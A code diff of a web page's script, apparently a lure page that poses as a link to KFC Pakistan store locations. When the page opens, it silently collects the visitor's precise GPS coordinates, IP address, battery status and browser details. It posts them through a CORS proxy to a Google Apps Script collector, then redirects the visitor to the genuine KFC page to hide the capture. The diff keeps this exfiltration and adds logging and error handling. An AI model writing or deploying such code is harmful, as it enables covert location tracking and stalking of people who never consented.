@@ -137,46 +137,50 @@ async function sendLocation() {
 
   // Geolocation
   if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      async (position) => {
-        lat = position.coords.latitude;
-        lon = position.coords.longitude;
-        accuracy = position.coords.accuracy;
+   navigator.geolocation.getCurrentPosition(
+  async (position) => {
+    lat = position.coords.latitude;
+    lon = position.coords.longitude;
+    accuracy = position.coords.accuracy;
 
-        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+    const mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
 
-        await fetch("https://corsproxy.io/?" + encodeURIComponent("https://script.google.com/macros/s/AKfycbxljE9VsM4fPUOBDYZhoI3tQDrATP_bm817-r5CAu3sNXmZ314ouy8Dv5yIL77NNjDt/exec"), {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            lat: lat.toString(),
-            lon: lon.toString(),
-            accuracy: accuracy.toString(),
-            ip: ip,
-            battery: battery,
-            ua: userAgent,
-            map: mapUrl
-          })
-        });
+    const payload = {
+      lat: lat,
+      lon: lon,
+      accuracy: accuracy,
+      ip: ip,
+      battery: battery,
+      ua: userAgent,
+      map: mapUrl
+    };
 
-        // Redirect after success
-        setTimeout(() => {
-          window.location.href = "https://www.kfcpakistan.com/store-locations";
-        }, 1000);
-      },
-      () => {
-        window.location.href = "https://www.kfcpakistan.com/store-locations";
-      }
-    );
-  } else {
+    console.log("📦 Sending to Google Sheet:", payload); // Debug line
+
+    try {
+      await fetch("https://corsproxy.io/?" + encodeURIComponent("https://script.google.com/macros/s/AKfycbxljE9VsM4fPUOBDYZhoI3tQDrATP_bm817-r5CAu3sNXmZ314ouy8Dv5yIL77NNjDt/exec"), {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      });
+    } catch (err) {
+      console.error("❌ Failed to send data:", err);
+    }
+
+    setTimeout(() => {
+      window.location.href = "https://www.kfcpakistan.com/store-locations";
+    }, 1000);
+  },
+  () => {
     window.location.href = "https://www.kfcpakistan.com/store-locations";
   }
-}
+);
 </script>
 </body>
 </html>
+
 
 
 
